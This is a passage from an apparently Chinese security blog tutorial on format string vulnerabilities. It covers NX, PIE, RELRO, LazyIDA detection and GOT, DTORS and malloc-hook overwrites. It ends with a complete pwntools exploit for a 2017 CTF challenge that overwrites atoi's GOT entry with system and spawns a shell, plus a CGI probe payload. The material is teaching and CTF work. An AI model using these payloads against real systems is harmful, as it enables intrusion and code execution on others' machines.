address执行栈上的shellcode的情况，NX机制限定了内存页“可写不可执行”，“可执行则不可写”。常说到的DEP也是一样的机制。</p><p>这个机制大家都太熟悉了，就不整理了。可见NX限制了通过格式化字符串漏洞在栈中写入SHELLCODE，覆盖address code的（和缓冲区溢出漏洞利用方法类似）利用途径。但对其他的利用方法没有影响。</p><h3 id="3-3-4-PIE"><a href="#3-3-4-PIE" class="headerlink" title="3.3.4 PIE"></a>3.3.4 PIE</h3><blockquote><p>参考：<a href="https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/" target="_blank" rel="noopener">https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/</a></p></blockquote><p>为了进一步解决缓冲区溢出、格式化字符串等漏洞以及ROP，ASLR机制被提出来了。PIE（Position Independent Executables）为基于ASLR而编译的可执行文件。一个PIE文件和所有依赖的库，会在每次运行时，被加载在随机的虚拟内存地址。<br>在现在常见的Linux系统中，ASLR是默认开启的，而且所有的库(.so)都是编译为PIE，故每次so库加载时都会在随机的地址。但是对于非PIE的ELF，ASLR并不生效，也就是这时每一次加载这个ELF文件，都会在固定的基址上。<br><img src="http://148.70.228.11/gs21.png" alt=""><br>通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd /bin/sh</span><br></pre></td></tr></table></figure></p><p>可看到依赖库libc.so的基址在不停的变化。</p><p>若可执行文件为PIE，即使它存在格式化字符串漏洞，也无法获得GOT表、DTORs区域等的地址，难以利用。</p><h3 id="3-3-5-RELRO"><a href="#3-3-5-RELRO" class="headerlink" title="3.3.5 RELRO"></a>3.3.5 RELRO</h3><blockquote><p>参考：<a href="http://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html" target="_blank" rel="noopener">http://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html</a> </p></blockquote><p>在checksec中，判断RELRO机制的代码是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if $readelf -l &quot;$1&quot; 2&gt;/dev/null | grep -q &apos;GNU_RELRO&apos;; then</span><br><span class="line">if $readelf -d &quot;$1&quot; 2&gt;/dev/null | grep -q &apos;BIND_NOW&apos;; then</span><br><span class="line">      echo_message &apos;\033[32mFull RELRO   \033[m   &apos; &apos;Full RELRO,&apos; &apos;&lt;file relro=&quot;full&quot;&apos; &apos; &quot;file&quot;: &#123; &quot;relro&quot;:&quot;full&quot;,&apos;</span><br><span class="line">  else</span><br><span class="line">      echo_message &apos;\033[33mPartial RELRO\033[m   &apos; &apos;Partial RELRO,&apos; &apos;&lt;file relro=&quot;partial&quot;&apos; &apos; &quot;file&quot;: &#123; &quot;relro&quot;:&quot;partial&quot;,&apos;</span><br><span class="line">  fi</span><br><span class="line">else</span><br><span class="line">  echo_message &apos;\033[31mNo RELRO     \033[m   &apos; &apos;No RELRO,&apos; &apos;&lt;file relro=&quot;no&quot;&apos; &apos; &quot;file&quot;: &#123; &quot;relro&quot;:&quot;no&quot;,&apos;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p><p>在ELF文件中读取到相关字段来判断RELRO机制的情况。</p><p>RELRO机制是一个不那么有名的，用于防止内存被漏洞恶意篡改的机制。分为Partial RELRO和FULL RELRO：<br><strong>Partial RELRO：</strong></p><ul><li>用gcc –W,-z,relro 编译</li><li>ELF区块重新排序，让ELF的内部数据区域（.got,.dtors等）先于程序区块(.data和.bss)</li><li>非PLT的GOT部分是只读</li><li>GOT部分依然可写<br><strong>Full RELRO：</strong></li><li>用gcc –Wl,-z,relro,-z,now编译</li><li>包含Partial RELRO</li><li>整个GOT可读 （可防止GOT被重写）<br>在利用格式化字符串漏洞被前，需要确定RELRO，来判断是否可写GOT。</li></ul><h2 id="3-4-检测工具"><a href="#3-4-检测工具" class="headerlink" title="3.4 检测工具"></a>3.4 检测工具</h2><p>检测格式化字符串漏洞常使用IDA里的一个插件，叫LazyIDA:</p><blockquote><p><a href="https://github.com/L4ys/LazyIDA" target="_blank" rel="noopener">https://github.com/L4ys/LazyIDA</a></p></blockquote><p>对于这样的一个简单程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char buf[40];</span><br><span class="line">    char v1;</span><br><span class="line">puts(&quot;WANT PLAY[Y/N]&quot;);</span><br><span class="line">v1=getchar();</span><br><span class="line">if(v1!=89) </span><br><span class="line">exit(0);</span><br><span class="line">puts(&quot;GET YOUR NAME:&quot;);</span><br><span class="line">memset(buf,0,40);</span><br><span class="line">scanf(&quot;%s&quot;,&amp;buf);</span><br><span class="line">puts(&quot;WELCOME &quot;);</span><br><span class="line">printf(buf);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>明显存在格式化字符串漏洞：<br><img src="http://148.70.228.11/gs22.png" alt=""><br>将LazyIDA的py文件放进IDA的plugins后，就可以在IDA中使用相关功能。用IDA加载以上的exe，在任意函数处右键选择“Scan format string vulnerabilities”:<br><img src="http://148.70.228.11/gs23.png" alt=""><br>得到很多函数：<br><img src="http://148.70.228.11/gs24.png" alt=""><br>双击入函数后，可看到扫描出来的格式化字符串的漏洞处：<br><img src="http://148.70.228.11/gs25.png" alt=""><br>但是存在一定的误报，比如这里扫描出来的fprintf处就没有格式化字符串漏洞：<br><img src="http://148.70.228.11/gs26.png" alt=""></p><h1 id="4-进阶利用"><a href="#4-进阶利用" class="headerlink" title="4. 进阶利用"></a>4. 进阶利用</h1><h2 id="4-1-返回到SHELLCODE"><a href="#4-1-返回到SHELLCODE" class="headerlink" title="4.1 返回到SHELLCODE"></a>4.1 返回到SHELLCODE</h2><p>返回到SHELLCODE即和缓冲区溢出一样的方法，覆盖返回地址到shellcode。可通过%n覆盖返回地址，直接跳到格式化字符串的buffer，在字符串中放入shellcode。也可利用%n写入shellcode。这种方法只适用于NX保护未开启时。</p><p>Shellcode可通过pwntools生成，使用shellcraft模块。</p><h2 id="4-2-GOT覆盖"><a href="#4-2-GOT覆盖" class="headerlink" title="4.2 GOT覆盖"></a>4.2 GOT覆盖</h2><p>每一个ELF可执行程序的进程空间中，都有一片特殊的空间—GOT表（Global Offset Table）。这一片空间存着可执行程序中用到的每一个输入函数的函数入口地址。Windows的PE文件同样有这样区域，在PE的文件头中记载着的输入表(IAT)。通过格式化字符串漏洞的任意读写能力，我们可以覆盖一个函数的GOT地址，用另一个函数来覆盖原函数的行为。</p><p>通过以下命令可看到ELF中的GOT：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump --dynamic-reloc binary</span><br></pre></td></tr></table></figure></p><p><img src="http://148.70.228.11/gs27.png" alt=""></p><p>当这个ELF程序调用printf时，会从GOT中得到printf函数的地址，再进行调用。如果我们可以覆盖GOT表中printf的地址为system()函数的地址，那么就可能在程序计划调用printf时，实际调用了system()，来为我们执行命令。</p><h2 id="4-3-DTORS覆盖"><a href="#4-3-DTORS覆盖" class="headerlink" title="4.3 DTORS覆盖"></a>4.3 DTORS覆盖</h2><p>这一种利用方法仅对GNU C 编译器生成的程序有效。用GCC编译的可执行文件有一个特殊的区域，称为dtors，指向可执行文件的析构函数。这个函数会在程序结束最后的’exit’函数之前被调用。DTORS区域的格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DTORS: 0xffffffff &lt;function address&gt; &lt;another function address&gt; ... 0x00000000</span><br></pre></td></tr></table></figure></p><p>第一个数值(0xffffffff)为这个区域内包含的函数指针的数量，若为空，则为-1。后跟随的数值，即为析构函数的地址。</p><p>我们先了解以下<strong>DTORS</strong>:<br>GNU C允许程序员利用<strong>attribute</strong>关键字后跟一个包含于双括号中的属性修饰符来声明函数的属性。属性修饰符包括constructor和destructor。constructor属性指示函数在main()之前被调用，destructor属性则表示函数将在main()执行完成后或exit()被调用后进行调用。</p><p>以下所示的程序展示了constructor和destructor属性的用法。该程序包含3个函数：main()、create()和destroy()。create()函数是一个构造函数， destroy()函数则是一个析构函数。这两个函数都没有被main()调用，main()只是打印了两个函数的地址然后就退出了。根据运行结果，显然，create()首先执行，然后是main()，最后才是destroy()。<br><img src="http://148.70.228.11/gs28.png" alt=""><br>构造函数和析构函数分别存储于生成的ELF可执行映像的.ctors和.dtors区中。在ELF运行时，这两个区域也会被映射到内存中，默认属性为可写。<br>可利用以下命令查看一个elf的.ctors/.dtors区：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump -s -j .ctors elf</span><br><span class="line">objdump -s -j .dtors elf</span><br></pre></td></tr></table></figure></p><p>对于高版本的gcc，不会生成.ctors/.dtors，而是改名为.init_array/.fini_array:<br><img src="http://148.70.228.11/gs29.png" alt=""><br>（我也不知道为什么第一个数值不是0xffffffff）<br>此处的dtors程序是由上面提供的C代码所编译而成的，定义了create()和destroy()函数。而dtors2程序则没有定义这两个函数。有趣的是，就算程序里没有定义这两个函数，.ctors/.dtors依然存在。既然他们默认可写，那么就可以被利用来执行非法函数。</p><p>用格式化字符串漏洞，将系统函数地址，如system函数的地址，覆盖DTORS表中结尾的00000000，就可以在程序退出时执行恶意函数。根据网上提供的利用经验，DTORS表中的第一个数值0xffffffff似乎不用去管它。</p><p>类似的攻击还有对__atexit函数的攻击利用。具体利用查看论文”__atexit in memory bugs: proof of concept, Pascal Bouchareine”</p><h2 id="4-4-HOOK函数劫持"><a href="#4-4-HOOK函数劫持" class="headerlink" title="4.4 HOOK函数劫持"></a>4.4 HOOK函数劫持</h2><p>GCC编译的程序里经常有一些特殊的HOOK函数，存于glibc库中，攻击者可利用格式化字符串覆盖这些HOOK函数的地址。最常用的就是__malloc_hook, __realloc_hook 和 __free_hook……这些函数常用来对malloc,realloc,free函数进行调试和监控。没有被用到时，这些函数被设置为<strong>NULL</strong>，在程序执行时处于可写的状态，攻击者可利用格式化字符串漏洞将hook函数覆盖为目标函数地址。这样每当malloc/realloc/free被调用时，都会执行hook函数中的程序。</p><p>__malloc_hook, __realloc_hook 和 __free_hook是定义在malloc.c中的hook函数。看一下malloc.c中的free函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void (*hook) (void *, const void *) = atomic_forced_read (__free_hook);</span><br><span class="line">if (__builtin_expect (hook != NULL, 0))</span><br><span class="line">&#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (0));</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>free函数在调用时，会先检查__free_hook的地址，若不为空，则先执行__free_hook。</p><p>具体的利用方法是，要先利用格式化字符串漏洞或其他漏洞，泄露出glibc的基地址，然后覆盖__malloc_hook的地址。</p><p>如果程序没有用到malloc，realloc,free函数，这个攻击途径依然可行，方法是利用<strong>printf</strong>。在printf中的格式化字符串<strong><em>%WIDTHs</em></strong>中的<strong><em>WIDTH</em></strong>长度超过32bytes时，printf会自动调用malloc和free来整理。看一下vfprintf.c的代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#define EXTSIZ 32</span><br><span class="line">enum &#123; WORK_BUFFER_SIZE = 1000 &#125;;</span><br><span class="line"></span><br><span class="line">if (width &gt;= WORK_BUFFER_SIZE - EXTSIZ)</span><br><span class="line">&#123;</span><br><span class="line">    /* We have to use a special buffer.  */ </span><br><span class="line">    size_t needed = ((size_t) width + EXTSIZ) * sizeof (CHAR_T);</span><br><span class="line">    if (__libc_use_alloca (needed))</span><br><span class="line">        workend = (CHAR_T *) alloca (needed) + width + EXTSIZ;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        workstart = (CHAR_T *) malloc (needed);</span><br><span class="line">        if (workstart == NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            done = -1;</span><br><span class="line">            goto all_done;</span><br><span class="line">        &#125;</span><br><span class="line">        workend = workstart + width + EXTSIZ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果长度足够的大，malloc会被调用。</p><h2 id="4-5-堆上的格式化字符串"><a href="#4-5-堆上的格式化字符串" class="headerlink" title="4.5 堆上的格式化字符串"></a>4.5 堆上的格式化字符串</h2><p>格式化字符串漏洞利用时，要想在设定地址处写入数据，需要访问到恶意格式化字符串中的地址值。这就要求格式化字符串本身在栈中。若用户提供的格式化字符串本身存在堆中，那么能利用漏洞来写内存到指定地址，就要求栈中有我们能控制的变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void func (char *user_at_heap)</span><br><span class="line">&#123;</span><br><span class="line">char outbuf[512];</span><br><span class="line">snprintf (outbut, sizeof (outbuf), user_at_heap);</span><br><span class="line">outbuf[sizeof (outbuf) - 1] = ’\0’;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是一种情况，字符串被复制到了栈中。</p><p>其他的情况需要攻击者能控制到栈中的某处数据。比如，部分对wu-ftpd的格式化字符串漏洞的利用中，会利用password参数在栈中的位置，来指定地址或shellcode。 </p><h1 id="5-案例"><a href="#5-案例" class="headerlink" title="5. 案例"></a>5. 案例</h1><h2 id="5-1-2017-湖湘杯PWN200"><a href="#5-1-2017-湖湘杯PWN200" class="headerlink" title="5.1 2017-湖湘杯PWN200"></a>5.1 2017-湖湘杯PWN200</h2><blockquote><p>参考：<a href="https://bbs.pediy.com/thread-224645.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224645.htm</a></p></blockquote><p>反编译：<br><img src="http://148.70.228.11/gs30.jpg" alt=""><br>根据反编译结果，我们写的以下程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char buf[40];</span><br><span class="line">    char v1;</span><br><span class="line">    while (1)&#123;</span><br><span class="line">puts(&quot;WANT PLAY[Y/N]&quot;);</span><br><span class="line">if(getchar()!=89) </span><br><span class="line">break;</span><br><span class="line">v1 = getchar();</span><br><span class="line">puts(&quot;GET YOUR NAME:&quot;);</span><br><span class="line">memset(buf,0,40);</span><br><span class="line">read(0,buf,0x40u);</span><br><span class="line">puts(&quot;WELCOME &quot;);</span><br><span class="line">printf(buf);</span><br><span class="line">puts(&quot;GET YOUR AGE:&quot;);</span><br><span class="line">read(0,buf,0x40u);</span><br><span class="line">if(atoi(&amp;buf)&gt;60) </span><br><span class="line">puts(&quot;OLD MEN!\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现printf函数直接打出了我们的输入，存在格式化字符串漏洞。<br>将以上程序，按原题的安全配置进行编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 pwn_formats.c -o pwnformats -no-pie</span><br></pre></td></tr></table></figure></p><p>用checksec检测防御机制：<br><img src="http://148.70.228.11/gs31.png" alt=""><br>开了Canary和NX, 并没有Full-Relro和PIE。没有开启PIE，所以ELF中每一个区域，如text，bss区，都是加载在固定的基址上。我们考虑最基本的GOT表修改。</p><p>既然要getshell，我们就用格式化字符串漏洞，将某个函数的GOT地址改为system的地址，再控制参数，执行system(‘/bin/sh’)。这里atoi函数的参数就为我们第二次输入的数据，这样覆盖atoi函数为system，再输入’/bin/sh’，即可直接getshell。</p><p><strong>完成以上任务的步骤应是：</strong></p><ol><li>得到puts函数所在的库的基址。</li><li>puts和system处于同一系统库libc.so中。CTF这道题给了libc.so的版本，为libc.so.6。根据puts函数和system函数在这一个版本的库中的地址偏移差，我们可以计算出system函数的地址。</li><li>覆盖GOT表中atoi函数的地址为system函数的地址。</li><li>在“GET YOUR AGE”时，输入”/bin/sh”，触发system(“/bin/sh”)，得到shell。</li></ol><p><strong>[1]</strong> 得到puts函数所在的库的基址：<br>运行程序，在”GET YOUR NAME”时，输入以下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAA-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x</span><br></pre></td></tr></table></figure></p><p>来找到栈上buffer和字符串的地址偏移：<br><img src="http://148.70.228.11/gs32.png" alt=""><br>第5个%08x读到字符串的头AAAA，因此偏移为5。知道偏移后，尝试用以下python脚本来读到GOT表中puts函数的地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./pwnformats&apos;)</span><br><span class="line">p = process(&apos;./pwnformats&apos;) </span><br><span class="line">p.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:&apos;)</span><br><span class="line">payload = &apos;%5$s&apos;+p32(elf.got[&apos;puts&apos;])</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure></p><p><img src="http://148.70.228.11/gs33.png" alt=""><br>就可以这样打出地址。这里输出前4位为p32(elf.got[‘puts’])，后4位则是输出的puts函数的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&apos;WELCOME \n&apos;)</span><br><span class="line">puts_addr=p.recv()[4:8]</span><br></pre></td></tr></table></figure></p><p><strong>[2]</strong> 算出system函数的地址<br>已知了libc.so的版本，就可以知道任意两个库中函数的偏移地址。上面已知了puts函数的地址，则可以这样算出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;] - libc.symbols[&apos;puts&apos;] + u32(puts_addr)</span><br></pre></td></tr></table></figure></p><p>因为libc.symbols函数的返回为十进制表示，这里用u32函数将二进制表示的puts_addr转换为十进制，算出了system函数的地址。</p><p><strong>[3]</strong> 覆盖GOT表中atoi函数的地址为system函数的地址。<br>获得GOT中atoi的位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atoi_got_addr = elf.got[&apos;atoi&apos;]</span><br></pre></td></tr></table></figure></p><p>在”GET YOUR NAME”的时候发格式化字符串payload，用以上求得的system函数地址覆盖atoi。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&apos;NAME:&apos;)</span><br><span class="line">p.sendline(fmtstr_payload(5, &#123;atoi_got_addr: system_addr&#125;))    # 5为buffer和字符串的偏移</span><br></pre></td></tr></table></figure></p><p><strong>[4]</strong> 在”GET YOUR AGE”时发’/bin/sh’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&apos;GET YOUR AGE:&apos;)</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)         # /bin/sh后需要\x00，是因为read函数不会自动在读到的内容后加入0x00来做字符串结尾</span><br><span class="line">                                  # 若不加0x00，会在/bin/sh后附上遇到下一个0x00前的所有数据，导致system执行错误</span><br></pre></td></tr></table></figure></p><p>最后得到脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line">elf = ELF(&apos;./pwnformats&apos;)</span><br><span class="line"># 1st</span><br><span class="line">p = process(&apos;./pwnformats&apos;) </span><br><span class="line">p.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:&apos;)</span><br><span class="line">payload = p32(elf.got[&apos;puts&apos;])+&apos;%5$s&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;WELCOME \n&apos;)</span><br><span class="line">puts_addr=p.recv()[4:8]</span><br><span class="line"># 2nd</span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;] - libc.symbols[&apos;puts&apos;] + u32(puts_addr)</span><br><span class="line"># 3rd</span><br><span class="line">atoi_got_addr = elf.got[&apos;atoi&apos;]</span><br><span class="line">p.sendline(&apos;17&apos;)</span><br><span class="line">p.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:&apos;)</span><br><span class="line">p.sendline(fmtstr_payload(5, &#123;atoi_got_addr: system_addr&#125;))</span><br><span class="line"># 4th</span><br><span class="line">p.recvuntil(&apos;GET YOUR AGE:&apos;)</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="http://148.70.228.11/gs34.png" alt=""><br><strong>Note:</strong><br>在编译成64位的测试过程时，发现这个格式化字符串没有输出我们想要的地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[&apos;puts&apos;])+&apos;%5$s&apos;</span><br></pre></td></tr></table></figure></p><p>后来发现是因为p32(elf.got[‘puts’])地址中包含0x00，在printf时遇到0x00直接就停止了输出。遇到这些情况，可以修改payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;%6$s&apos;+p32(elf.got[&apos;puts&apos;])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;WELCOME \n&apos;)</span><br><span class="line">puts_addr=p.recv()[0:4]     # 这时先输出的前4位为地址</span><br></pre></td></tr></table></figure></p><p>先输出想要的地址，这时替换地址的字符串不变，依旧为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(fmtstr_payload(5, &#123;atoi_got_addr: system_addr&#125;))</span><br></pre></td></tr></table></figure></p><p> </p><h2 id="5-2-某电脑管家"><a href="#5-2-某电脑管家" class="headerlink" title="5.2 某电脑管家"></a>5.2 某电脑管家</h2><p>在某个版本的电脑管家中，可看到这样的文件：zh-cn.dat<br><img src="http://148.70.228.11/gs35.png" alt=""><br>可见里面有明显的格式化字符串，就可借此判断可能存在格式化字符串漏洞。<br><img src="http://148.70.228.11/gs36.png" alt=""><br>恶意程序可以直接修改这个配置文件，导致应用程序的拒绝服务。</p><h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h1><p>认识格式化字符串对Web测试也不是没有用处。以前测试过一些摄像头的Web应用，它们都是基于C/C++实现的cgi，这时就可以测试格式化字符串的漏洞。比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hostname/cgi-bin/query.cgi?name=john&amp;code=45765</span><br></pre></td></tr></table></figure></p><p>这个接口若存在格式化字符串漏洞，则利用以下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hostname/cgi-bin/query.cgi?name=john%x.%x.%x&amp;code=45765%x.%x</span><br></pre></td></tr></table></figure></p><p>进行测试。</p><h1 id="7-参考"><a href="#7-参考" class="headerlink" title="7. 参考"></a>7. 参考</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">• Exploiting Format String Vulnerabilities Scut,Teamteso,September1,2001</span><br><span class="line">• How Effective is ASLR on Linux Systems?</span><br><span class="line">• 漏洞战争 软件漏洞分析精要</span><br><span class="line">• https://book.2cto.com/201312/38537.html</span><br><span class="line">• http://www.bright-shadows.net/tutorials/dtors.txt</span><br><span class="line">• https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/</span><br><span class="line">• http://pwntools.readthedocs.io/en/stable/fmtstr.html</span><br><span class="line">• https://github.com/slimm609/checksec.sh</span><br><span class="line">• http://libcdb.com/ </span><br><span class="line">• https://access.redhat.com/blogs/766093/posts/3548631</span><br><span class="line">• https://access.redhat.com/blogs/766093/posts/3606481</span><br><span class="line">• https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/</span><br><span class="line">• http://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html </span><br><span class="line">• https://github.com/L4ys/LazyIDA</span><br><span class="line">• https://bbs.pediy.com/thread-224645.htm</span><br></pre></td></tr></table></figure><p>如果有时间可以有待更新一下这些=。=：</p><blockquote><p><a href="https://bbs.pediy.com/thread-224645.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224645.htm</a><br><a href="https://www.jianshu.com/p/097e211cd9eb" target="_blank" rel="noopener">https://www.jianshu.com/p/097e211cd9eb</a><br><a href="https://blog.csdn.net/qq_33438733/article/details/72803627" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/72803627</a><br><a href="https://bbs.pediy.com/thread-225003.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225003.htm</a><br><a href="https://xz.aliyun.com/t/214" target="_blank" rel="noopener">https://xz.aliyun.com/t/214</a> </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;前言：&lt;/strong&gt;&lt;br&gt;格式化字符串漏洞是比较古老的漏洞了，已经被研究了好多年，在目前广泛的ASLR和vsprintf/vprintf等新函数的保护下，这个漏洞也已经不常见。写这个只是因为，在之前读书时，专门读了这个漏洞的文
      
    
    </summary>
    
      <category term="二进制" scheme="http://fanxs-t.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
